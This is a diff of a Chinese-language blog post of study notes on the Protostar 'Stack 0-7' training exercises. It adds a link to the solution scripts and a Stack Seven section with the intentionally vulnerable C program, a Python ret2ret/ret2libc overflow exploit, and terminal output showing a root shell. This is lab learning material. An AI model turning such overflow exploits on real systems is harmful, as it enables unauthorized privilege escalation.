@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='大概只是作为学习的时候的一点点笔记'><title>[unfinished] Protostar Stack 0-7 Walkthrough</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='随手记一些...怕以后忘了可以用来复习'><title>[unfinished] Protostar Stack 0-7 Walkthrough</title>
 
 <link rel='canonical' href='/p/protostar_stack_4-7/'>
 
 <link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='[unfinished] Protostar Stack 0-7 Walkthrough'>
-<meta property='og:description' content='大概只是作为学习的时候的一点点笔记'>
+<meta property='og:description' content='随手记一些...怕以后忘了可以用来复习'>
 <meta property='og:url' content='/p/protostar_stack_4-7/'>
 <meta property='og:site_name' content='Senri&#39;s Memo'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-03-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-22T00:00:00&#43;00:00'/><meta property='og:image' content='/p/protostar_stack_4-7/cover.png' />
 <meta name="twitter:site" content="@KurusuSenri">
     <meta name="twitter:creator" content="@KurusuSenri"><meta name="twitter:title" content="[unfinished] Protostar Stack 0-7 Walkthrough">
-<meta name="twitter:description" content="大概只是作为学习的时候的一点点笔记"><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="随手记一些...怕以后忘了可以用来复习"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='/p/protostar_stack_4-7/cover.png' />
     <link rel="shortcut icon" href="favicon.ico" />
 
@@ -92,7 +92,7 @@
 
     
     <h3 class="article-subtitle">
-        大概只是作为学习的时候的一点点笔记
+        随手记一些...怕以后忘了可以用来复习
     </h3>
     
 
@@ -120,7 +120,10 @@
 </header>
 
     <section class="article-content">
-    <h2 id="protostar">Protostar</h2>
+    <p>所有的 python 脚本已经放在了<a class="link" href="https://github.com/KurusuSenri/protostar_stack_0-7_solution"  target="_blank" rel="noopener"
+    >这里</a></p>
+<hr />
+<h2 id="protostar">Protostar</h2>
 <p><a class="link" href="https://exploit.education/protostar/"  target="_blank" rel="noopener"
     >☞ Protostar</a></p>
 <p>Protostar introduces the following in a friendly way:</p>
@@ -745,8 +748,57 @@ $1 = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;
 </span></span></code></pre></div><p>成功w</p>
 <hr />
 <h2 id="stack-seven">Stack Seven</h2>
-<p>晚点再总结&hellip;</p>
-
+<blockquote>
+<p>Stack6 introduces return to .text to gain code execution.</p>
+<p>The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.</p>
+<p>This level is at /opt/protostar/bin/stack7</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">getpath</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ret;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;input path please: &#34;</span>); fflush(stdout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  gets(buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> __builtin_return_address(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>((ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xb0000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb0000000</span>) {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;bzzzt (%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
+</span></span><span style="display:flex;"><span>      _exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;got path %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> strdup(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  getpath();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>实际上这题和上面的 Stack Six 差不多，结合一下 ret2ret 和 ret2libc 就可以了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT&#34;</span>
+</span></span><span style="display:flex;"><span>ret_itself_addr <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0x08048544</span>)
+</span></span><span style="display:flex;"><span>libc_system <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0xb7ecffb0</span>)
+</span></span><span style="display:flex;"><span>return_addr_after_system <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAA&#34;</span>
+</span></span><span style="display:flex;"><span>bin_sh_addr <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0xb7fb63bf</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print (padding<span style="color:#f92672">+</span> ret_itself_addr <span style="color:#f92672">+</span> libc_system <span style="color:#f92672">+</span> return_addr_after_system <span style="color:#f92672">+</span> bin_sh_addr)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ <span style="color:#f92672">(</span>python stack7.py; cat<span style="color:#f92672">)</span> | /opt/protostar/bin/stack7
+</span></span><span style="display:flex;"><span>input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPDRRRRSSSSTTTTD???AAAA?c??
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>ls /
+</span></span><span style="display:flex;"><span>bin  boot  dev	etc  home  initrd.img  lib  live  lost+found  media  mnt  opt  proc  sbin  selinux  srv  sys  tmp  usr	var  vmlinuz
+</span></span></code></pre></div>
 </section>
 
 
